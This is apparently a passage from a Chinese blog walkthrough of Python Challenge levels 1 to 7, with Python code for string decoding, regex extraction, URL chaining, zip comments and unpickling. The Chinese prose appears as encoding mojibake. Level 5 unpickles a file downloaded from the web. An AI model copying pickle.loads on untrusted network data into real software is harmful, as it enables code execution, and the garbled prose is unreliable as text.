<li><p>è¿”å›å€¼ï¼š è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚</p></li>
<li><p>è§£å‹ï¼š <code>zip(*è¢«å‹ç¼©çš„å¯¹è±¡)</code>ï¼Œè¿”å›äºŒç»´çŸ©é˜µå¼</p></li>
<li><p>æœ¬é¢˜æ¼”ç¤ºï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span> <span class="comment"># åŸæ¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">intab = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz,. &#x27;()&quot;</span>  </span><br><span class="line">outtab = <span class="string">&quot;cdefghijklmnopqrstuvwxyzab,. &#x27;()&quot;</span>  </span><br><span class="line">transtab = <span class="built_in">dict</span>(<span class="built_in">zip</span>(intab, outtab))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(transtab[x] <span class="keyword">for</span> x <span class="keyword">in</span> encypt_str))</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h1 id="level-2">level 2</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-2">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130103607.png" /></p>
<p>æ³¨æ„çº¢è‰²å­—ç¬¦ä¸²ï¼Œè¦æˆ‘ä»¬ä»å›¾ç‰‡ä¸­çš„ä¹¦é‡Œæˆ–è€…é¡µé¢æºç ä¸­æ‰¾å­—ç¬¦ã€‚é¦–å…ˆï¼Œä¹¦é‡Œæ ¹æœ¬çœ‹ä¸æ¸…ï¼Œæ‰€ä»¥åªèƒ½ä»é¡µé¢æºç ä¸­æ‰¾ï¼Œæ‰“å¼€é¡µé¢æºç ï¼Œå¾€ä¸‹æ»‘åŠ¨ï¼Œå‘ç°ç¡®å®æœ‰ï¼Œä½†æ˜¯å†…å®¹å¾ˆå¤šï¼Œéœ€è¦å†™è„šæœ¬ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130103757.png" /></p>
<h2 id="æ–¹æ³•-4">æ–¹æ³•</h2>
<p><strong>æ­¥éª¤ï¼š</strong></p>
<ol type="1">
<li><p>è¯·æ±‚ç½‘å€ï¼Œè·å¾—é¡µé¢æºç </p></li>
<li><p>æ‹¿åˆ°è¿™ä¸²å­—ç¬¦ä¸²</p></li>
<li><p>ä»ä¸­æ‰¾å‡ºå­—æ¯</p></li>
</ol>
<p><strong>ä»£ç ï¼š</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/ocr.html&quot;</span>  </span><br><span class="line">r = requests.get(url)  </span><br><span class="line">tar = re.findall(<span class="string">r&#x27;&lt;!--(.*?)--&gt;&#x27;</span>, r.text, flags=re.S)[<span class="number">1</span>]  <span class="comment"># æ‰¾åˆ°ä¸€å¤§ä¸²å­—ç¬¦ä¸²</span></span><br><span class="line">ch_lst = re.findall(<span class="string">r&#x27;[a-zA-Z0-9]+&#x27;</span>, tar)  <span class="comment"># æ‹¿åˆ°å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> ch_lst)) <span class="comment"># æ‹¼æ¥æˆ url</span></span><br></pre></td></tr></table></figure></p>
<p><strong>ç»“æœï¼š</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">equality</span><br></pre></td></tr></table></figure></p>
<p>ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/def/ocr.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/def/equality.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-3">level 3</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-3">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130142422.png" /></p>
<p>é™¤äº†ä¸€å¥æç¤ºï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°å­—ç¬¦ä¸²ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130142748.png" /></p>
<p>æ ¹æ®æç¤ºåšå‡ºåˆç†çŒœæµ‹ï¼š<strong>æ‰¾å‡ºè¿™ä¸€å­—ç¬¦ä¸²ä¸­çš„å°å†™å­—æ¯ï¼Œæ¯ä¸ªå°å†™å­—æ¯çš„å‰åéƒ½æ˜¯ä¸‰ä¸ªå¤§å†™å­—æ¯ï¼ï¼ï¼ä¹Ÿå°±æ˜¯ AAAbCCC ç±»å‹çš„</strong></p>
<h2 id="æ–¹æ³•-5">æ–¹æ³•</h2>
<p><strong>æ­¥éª¤ï¼š</strong></p>
<ol type="1">
<li>è¯·æ±‚ç½‘å€ï¼Œæ‹¿åˆ°é¡µé¢æºç </li>
<li>å–å‡ºè¿™ä¸€å¤§ä¸²å­—ç¬¦ä¸²</li>
<li>ä»ä¸­æ‰¾å‡ºç¬¦åˆæ¡ä»¶çš„å°å†™å­—æ¯</li>
</ol>
<p><strong>ä»£ç ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/equality.html&#x27;</span>  </span><br><span class="line">r = requests.get(url)  </span><br><span class="line">tar = re.findall(<span class="string">r&#x27;&lt;!--(.*?)--&gt;&#x27;</span>, r.text, flags = re.S)[-<span class="number">1</span>] <span class="comment"># å–å‡ºç›®æ ‡å­—ç¬¦ä¸²  </span></span><br><span class="line">ch_lst = re.findall(<span class="string">r&#x27;[^A-Z]+[A-Z]&#123;3&#125;([a-z])[A-Z]&#123;3&#125;[^A-Z]+&#x27;</span>, tar, re.S)    <span class="comment"># ä»ç›®æ ‡å­—ç¬¦ä¸²ä¸­å–å‡ºç¬¦åˆæ¡ä»¶çš„å°å†™å­—æ¯  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> ch_lst)) <span class="comment"># æ‹¼æ¥æˆ url</span></span><br></pre></td></tr></table></figure>
<p><strong>è§£é‡Šï¼š</strong> ä¸»è¦è¯´æ˜ä¸€ä¸‹å–å‡ºç¬¦åˆæ¡ä»¶çš„å°å†™å­—æ¯çš„æ¨¡å¼æ˜¯å¦‚ä½•è€Œæ¥çš„ã€‚</p>
<p><code>[a-z]</code> è¡¨ç¤ºä¸€ä¸ªå°å†™å­—æ¯ï¼›</p>
<p><code>[A-Z]</code> è¡¨ç¤ºä¸€ä¸ªå¤§å†™å­—æ¯ï¼›</p>
<p><code>[A-Z]&#123;3&#125;</code> è¡¨ç¤ºä¸‰ä¸ªå¤§å†™å­—æ¯ï¼›</p>
<p><code>[A-Z]&#123;3&#125;[a-z][A-Z]&#123;3&#125;</code> è¡¨ç¤º ...AAAbCCC... ç±»å‹çš„ï¼Œæ³¨æ„ ... å¯èƒ½ä¸ºå¤§å†™ï¼Œæ¯”å¦‚è¯´ï¼šAAAAbCCC ä¹Ÿæ˜¯ä¼šè¢«åŒ¹é…åˆ°çš„ï¼Œä½†æ˜¯ï¼Œé¢˜ç›®è¦æ±‚çš„å°å†™å­—æ¯æ˜¯å‰åä¸¥æ ¼åªæœ‰ä¸‰ä¸ªå¤§å†™å­—æ¯ï¼Œæ‰€ä»¥è¿˜éœ€è¦è¡¥ä¸Š <code>[^A-Z]</code> ï¼Œè¿™è¡¨ç¤ºéå¤§å†™å­—æ¯</p>
<p>æ€»çš„æ¨¡å¼å°±æ˜¯ï¼š<code>[^A-Z]+[A-Z]&#123;3&#125;([a-z])[A-Z]&#123;3&#125;[^A-Z]+</code>ï¼Œè¿™ä¸ª <code>+</code> å†™ä¸å†™æ— æ‰€è°“ï¼Œå°±æœ¬é¢˜è€Œè¨€ï¼Œä¸»è¦æ˜¯ <code>aAAAbCCCc</code> çš„éƒ½è¡Œï¼Œæ— æ‰€è°“å‰åæ˜¯å¤§å†™è¿˜æ˜¯å°å†™ã€‚</p>
<p>ç»“æœï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linkedlist</span><br></pre></td></tr></table></figure></p>
<p>ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/def/equality.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/def/linkedlist.html</span><br></pre></td></tr></table></figure></p>
<p>è®¿é—®ä¿®æ”¹åçš„ url å¾—åˆ°æç¤º <code>linkedlist.php</code> ï¼Œè®¿é—®<code>http://www.pythonchallenge.com/pc/def/linkedlist.php</code> å³å¯ã€‚</p>
<h1 id="level-4">level 4</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-4">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194001.png" /></p>
<p>é¡µé¢æºç ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194018.png" /></p>
<p>ç‚¹å‡»å›¾ç‰‡å‘ç°å¯ä»¥è·³è½¬ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194032.png" /></p>
<p>æ³¨æ„ url ä¸­çš„ nothingï¼Œåº”è¯¥æ˜¯é€šè¿‡ä¸åœçš„è·å¾— nothing ç„¶åè·³è½¬åˆ°ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œæœ€åæŸä¸ªé¡µé¢ä¼šå‡ºæ¥ç­”æ¡ˆã€‚æ‰‹åŠ¨å‡ æ¬¡åå‘ç°ç¡®å®å¦‚æ­¤ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194143.png" /></p>
<p><strong>æ³¨æ„ï¼šæœ¬é¢˜æ·±å‘</strong></p>
<h2 id="æ–¹æ³•-6">æ–¹æ³•</h2>
<p><strong>ä»£ç ï¼š</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing  </span><br><span class="line">    r = requests.get(url)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        nothing = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>, r.text)[-<span class="number">1</span>])  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;nothing: %d&quot;</span> % nothing)  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        nothing /= <span class="number">2</span>  </span><br><span class="line">	<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
<p><strong>è§£é‡Šï¼š</strong> é¦–å…ˆä¾‹ä¸¾ä¸€ä¸‹è¿™é¢˜æˆ‘é‡åˆ°çš„å‘ï¼</p>
<p>åŸå…ˆæˆ‘çš„ä»£ç æ˜¯è¿™æ ·çš„ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    nothing = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, r.text).group())</span><br></pre></td></tr></table></figure></p>
<p>è¿è¡Œä¸€æ®µæ—¶é—´åï¼Œå¾—åˆ°å¦‚ä¸‹æŠ¥é”™ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;group&#x27;</span><br></pre></td></tr></table></figure></p>
<p>å¹¶ä¸”æ­¤æ—¶é¡µé¢çš„å†…å®¹ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Yes. Divide by two and keep going.</span><br></pre></td></tr></table></figure></p>
<p>å› ä¸ºæ­¤æ—¶é¡µé¢å¹¶æ²¡æœ‰æ•°å­—ï¼Œæ— æ³•åŒ¹é…ï¼Œä¹Ÿå°±æ²¡æœ‰è¿”å›åŒ¹é…å¯¹è±¡ï¼Œæ›´åŠ æ²¡æœ‰ group() æ–¹æ³•ï¼Œæ‰€ä»¥æŠ¥é”™ã€‚å› æ­¤ï¼Œæˆ‘å°†ä»£ç ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing  </span><br><span class="line">    r = requests.get(url)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        nothing = <span class="built_in">int</span>(re.search(<span class="string">r&#x27;\d+&#x27;</span>, r.text).group())  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;nothing: %d&quot;</span> % nothing)  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        nothing /= <span class="number">2</span></span><br><span class="line">		<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åèƒ½å¤Ÿè¶Šè¿‡è¿™ä¸ªå‘ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130195351.png" /></p>
<p>è·³è¿›ä¸‹ä¸€ä¸ªå‘ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130195449.png" /></p>
<p>å½“ nothing = 82683 æ—¶ï¼Œé¡µé¢å†…å®¹å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You&#x27;ve been misleaded to here. Go to previous one and check.</span><br></pre></td></tr></table></figure></p>
<p>å‰ä¸€ä¸ªæ˜¯ 82682ï¼Œé¡µé¢å†…å®¹å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">There maybe misleading numbers in the text. One example is 82683. Look only for the next nothing and the next nothing is 63579</span><br></pre></td></tr></table></figure></p>
<p>å› ä¸º re.search() åŒ¹é…åˆ°ç¬¬ä¸€ä¸ªå°±ä¼šè¿”å›ï¼Œæ‰€ä»¥æ‰ä¼šè¸©åˆ°è¿™ä¸ªå‘ï¼Œè¿™é‡Œçš„ nothing æ˜¯ç¬¬äºŒä¸ªï¼Œæ‰€ä»¥ä¿®æ”¹ä¸ºæœ€ç»ˆä»£ç ï¼Œå°±æ˜¯åˆšåˆšç»™çš„ï¼Œæœ€åé¡ºåˆ©å¾—åˆ°ç»“æœï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130200232.png" /></p>
<p>è¿™é‡Œå…¶å®å­˜åœ¨ç€å¦ä¸€ä¸ªå‘ï¼Œå¾—åˆ° peak.html çš„ nothing = 66831ï¼Œæ­¤æ—¶å¦‚æœä½ æ²¡æœ‰æ˜¾ç¤ºæ¯ä¸€é¡µçš„å†…å®¹ <code>print(r.text)</code>ï¼Œæå®¹æ˜“é”™è¿‡ä¿¡æ¯ï¼Œå› ä¸ºæ­¤æ—¶ nothing /= 2ï¼Œä¹Ÿèƒ½è®¿é—®ï¼Œçœ‹åé¢èƒ½å¤Ÿç»§ç»­å°±çŸ¥é“äº†ã€‚</p>
<p>ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/def/linkedlist.php</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/def/peak.html</span><br></pre></td></tr></table></figure></p>
<p><strong>æ³¨æ„ï¼š</strong> é‡åˆ°å‘ä¹‹åçš„ nothing ä¸è¦ä»å¤´å¼€å§‹ï¼Œè¿™æ ·ä¼šçœæ—¶é—´ã€‚</p>
<h1 id="level-5">level 5</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-5">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130205619.png" /></p>
<p>é¡µé¢æºç ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130205643.png" /></p>
<p>æ³¨æ„ç»¿å­—æé†’ï¼špython ä¸­æœ‰ä¸€ä¸ªåº“å«åš pickleï¼Œç”¨æ¥åºåˆ—åŒ–å’Œéåºåˆ—åŒ–çš„ã€‚å› æ­¤ï¼Œæœ¬é¢˜éœ€è¦ä½¿ç”¨åˆ°è¯¥åº“ã€‚è¿˜æœ‰ <code>banner.p</code> ç‚¹è¿›å»å‘ç°æ˜¯çœ‹ä¸æ‡‚çš„ä¸€å †å­—ç¬¦ä¸²ï¼Œåšä¸€ä¸ªåˆç†çš„çŒœæµ‹ï¼š<strong><code>banner.p</code> ä¸­çš„å­—ç¬¦ä¸²æ˜¯ç»è¿‡åºåˆ—åŒ–çš„ï¼Œå°†å®ƒååºåˆ—åº”è¯¥ä¼šå¾—åˆ°ç­”æ¡ˆ</strong></p>
<h2 id="æ–¹æ³•-7">æ–¹æ³•</h2>
<p><strong>ä»£ç ï¼š</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, pickle  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/banner.p&#x27;</span>  </span><br><span class="line">raw = requests.get(url).content  </span><br><span class="line"><span class="built_in">print</span>(pickle.loads(raw))</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°å¾—åˆ°çœ‹ä¸æ‡‚çš„ä¸€å †ä¸œè¥¿ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130210254.png" /></p>
<p>ä»”ç»†è§‚å¯Ÿå‘ç°ï¼Œæ˜¯ä¸€ä¸ªäºŒå…ƒåˆ—è¡¨ï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç»„ç»„æˆçš„ï¼ŒçŒœæµ‹ï¼ˆçœ‹å®Œç­”æ¡ˆåï¼‰ï¼š<strong>æ¯ä¸€è¡Œå…¶å®éƒ½æ˜¯å­—ç¬¦ä¸²çš„å‹ç¼©ï¼šå°†ä¸€è¡Œå­—ç¬¦ä¸²å‹ç¼©æˆ <code>[(å­—ç¬¦1ï¼Œå‡ºç°æ¬¡æ•°), (å­—ç¬¦2ï¼Œå‡ºç°æ¬¡æ•°)...]</code> å› æ­¤ï¼Œåªè¦å°†æ¯ä¸€è¡Œè¿˜åŸæˆåŸæ¥çš„æ ·å­å³å¯ã€‚</strong></p>
<p><strong>æœ€ç»ˆä»£ç ï¼š</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, pickle  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/banner.p&#x27;</span>  </span><br><span class="line">raw = requests.get(url).content  <span class="comment"># è½¬ä¸º byteï¼Œå› ä¸º loads() çš„å‚æ•°æ˜¯ byte ç±»å‹çš„</span></span><br><span class="line">data = pickle.loads(raw)  </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([ch * num <span class="keyword">for</span> ch, num <span class="keyword">in</span> line]))</span><br></pre></td></tr></table></figure></p>
<p><strong>ç»“æœï¼š</strong> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130210708.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/def/peak.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/def/channel.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-6">level 6</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-6">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131103728.png" /></p>
<p>æŸ¥çœ‹é¡µé¢æºç ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131103745.png" /></p>
<p>æ³¨æ„ï¼šhtml æ—è¾¹çš„ <code>&lt;!-- &lt;-- zip --&gt;</code>ã€‚å°è¯•å°† html ä¿®æ”¹ä¸º zip å‘ç°å¯ä»¥ä¸‹è½½ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ã€‚</p>
<p>å‹ç¼©æ–‡åŒ…é‡Œæœ‰è®¸å¤šæ–‡ä»¶ï¼Œå…ˆçœ‹ <code>readme.txt</code>ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcome to my zipped list.  </span><br><span class="line">  </span><br><span class="line">hint1: start from 90052  </span><br><span class="line">hint2: answer is inside the zip</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥çœ‹ä¹‹åçŒœæµ‹ï¼Œé™¤ <code>readme.txt</code> ä¹‹å¤–æ¯ä¸€ä¸ªæ–‡ä»¶å†…å®¹éƒ½æ˜¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next nothing is (\d+)</span><br></pre></td></tr></table></figure></p>
<p>æ€è·¯ï¼š<strong>nothing ä» 90052 å¼€å§‹ï¼Œå…ˆè®¿é—®å¯¹åº”æ–‡ä»¶ï¼Œç„¶åè¯»å–ä¸‹ä¸€ä¸ª nothing ç»§ç»­è®¿é—®ã€‚ç›´åˆ°å‡ºç°ä¸åŒ</strong></p>
<h2 id="æ–¹æ³•-8">æ–¹æ³•</h2>
<p>ç¬¬ä¸€æ¬¡ä»£ç ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">rpath = <span class="string">&quot;attachments/level_6/%s.txt&quot;</span>  </span><br><span class="line">nothing = <span class="string">&quot;90052&quot;</span>  </span><br><span class="line">pattern = <span class="string">&quot;Next nothing is (\d+)&quot;</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">    path = rpath % nothing  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        content = f.read()  </span><br><span class="line">        <span class="built_in">print</span>(content)  </span><br><span class="line">        match = re.search(pattern, content)  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">	nothing = match.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼š <code>match.group(1)</code>ï¼šå› ä¸ºä»£ç ä¸­çš„ pattern é‡Œé¢åªæœ‰ä¸€ä¸ªæ‹¬å·ï¼ˆåœ¨æˆ‘ä»¬éœ€è¦å¤„åŠ ä¸Šæ‹¬å·ï¼‰ï¼Œè¿™æ ·å­åŒ¹é…ä¸‹æ¥çš„å…¶å®æ˜¯ä¸€æ•´å¥è¯ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Next nothing is (\d+)</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬åªéœ€è¦ () ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨ <code>match.group()</code> å°±ä¼šå°†æ•´å¥è¯ç»™ nothingï¼Œè€Œ <code>group(1)</code> å°±æ˜¯åªè¯»å–ç¬¬ä¸€ä¸ªæ‹¬å·ä¸­çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯ () å³ nothingã€‚</p>
<p>ä¸å‡ºæ‰€æ–™ï¼Œæœç„¶æ²¡è¿™ä¹ˆç®€å•ï¼Œå½“ nothing = 46145 æ—¶ï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131105144.png" /></p>
<p>ç°åœ¨çš„é—®é¢˜æ˜¯ä»€ä¹ˆæ˜¯ commentsï¼Ÿç»è¿‡ç™¾åº¦åå‘ç° zip æ–‡ä»¶æœ‰ commentï¼Œç”¨æ¥å†™é¢å¤–çš„æè¿°æ•°æ®ã€‚python ä¸­æœ‰ zipfile åº“å¯ä»¥è·å¾— commentã€‚</p>
<p>æœ€ç»ˆä»£ç ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re, zipfile  </span><br><span class="line">path = <span class="string">&quot;attachments/level_6/channel.zip&quot;</span>  </span><br><span class="line">nothing = <span class="string">&quot;90052&quot;</span>  </span><br><span class="line">comment = []  </span><br><span class="line">pattern = <span class="string">&quot;Next nothing is (\d+)&quot;</span>  </span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        fileName = nothing + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">        content = f.read(fileName).decode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">        comment.append(f.getinfo(fileName).comment.decode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">        match = re.search(pattern, content)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:  </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nothing = match.group(<span class="number">1</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(comment))</span><br></pre></td></tr></table></figure></p>
<p>ç»“æœï¼š <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220131110030.png" /></p>
<p>è®¿é—® <code>http://www.pythonchallenge.com/pc/def/hockey.html</code>ï¼Œå¾—åˆ°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">it&#x27;s in the air. look at the letters.</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„åˆ°ï¼Œç»„æˆ HOCKY çš„å­—æ¯ä¸º oxygenï¼Œå› æ­¤ä¿®æ”¹ urlï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å‰ï¼šhttp://www.pythonchallenge.com/pc/def/hockey.html</span><br><span class="line">ä¿®æ”¹åï¼šhttp://www.pythonchallenge.com/pc/def/oxygen.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-7">level 7</h1>
<h2 id="é¢˜ç›®ä¿¡æ¯-7">é¢˜ç›®ä¿¡æ¯</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220201114933.png" /></p>
<p>åªæœ‰ä¸Šé¢ä¸€å¼ å¥‡æ€ªçš„å›¾ç‰‡ï¼Œé¡µé¢æºç ä¹Ÿæ²¡æœ‰ä¸œè¥¿ã€‚å¯ä»¥çœ‹åˆ°å›¾ç‰‡ä¸Šæœ‰ä¸€äº›ç°åº¦å—ï¼Œç›®å‰åˆç†çŒœæµ‹å°±æ˜¯ï¼š<strong>è¿™äº›ç°åº¦å—éšè—ç€ä¿¡æ¯ã€‚</strong></p>
<h2 id="æ–¹æ³•-9">æ–¹æ³•</h2>
